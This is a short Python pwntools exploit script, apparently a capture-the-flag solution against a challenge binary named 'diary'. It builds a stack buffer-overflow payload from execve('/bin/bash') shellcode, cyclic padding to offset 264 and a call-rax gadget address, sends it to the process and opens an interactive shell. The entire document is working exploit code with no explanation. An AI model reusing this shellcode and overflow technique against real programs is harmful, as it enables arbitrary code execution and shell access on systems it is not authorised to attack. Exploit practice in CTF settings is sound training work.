from pwn import *
io = process('../../TFC/diary')

offset = 264
call_rax = 0x401014
shellcode = b'\xeb\x0b\x5f\x48\x31\xd2\x52\x5e\x6a\x3b\x58\x0f\x05\xe8\xf0\xff\xff\xff\x2f\x2f\x2f\x2f\x62\x69\x6e\x2f\x2f\x2f\x2f\x62\x61\x73\x68\x00'
payload = shellcode + cyclic(offset-len(shellcode)) + p64(call_rax)
io.sendline(payload)
io.interactive()
